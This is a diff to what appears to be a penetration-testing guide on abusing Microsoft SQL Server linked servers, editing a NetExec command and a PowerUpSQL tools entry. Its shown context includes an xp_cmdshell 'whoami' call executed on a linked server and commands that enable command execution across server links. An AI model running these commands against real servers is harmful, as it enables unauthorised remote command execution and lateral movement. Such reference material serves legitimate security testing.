@@ -39,7 +39,7 @@ EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SRV];
 # PowerUpSQL maps and crawls link chains automatically, resolving the effective rights at each hop
 # Get-SQLServerLinkCrawl -Instance <srv>
 # NetExec: enable cmdshell over a link
-nxc mssql <target> -u user -p pass -M link_enable_cmdshell
+nxc mssql <target> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=<name> ACTION=enable
 ```
 
 ## Exploitation notes
@@ -51,7 +51,7 @@ nxc mssql <target> -u user -p pass -M link_enable_cmdshell
 
 ## Tools
 
-- **PowerUpSQL** (`Get-SQLServerLinkCrawl`, `Invoke-SQLOSCmd -LinkedInstance`): crawl and execute across links.
+- **PowerUpSQL** (`Get-SQLServerLinkCrawl -Query`): crawl the link graph and run a query at each reachable instance.
 - **Impacket `mssqlclient.py`** (`enum_links`): list and use links interactively.
 - **NetExec `mssql`** (`-M link_enable_cmdshell`): enable command execution over a link.
 
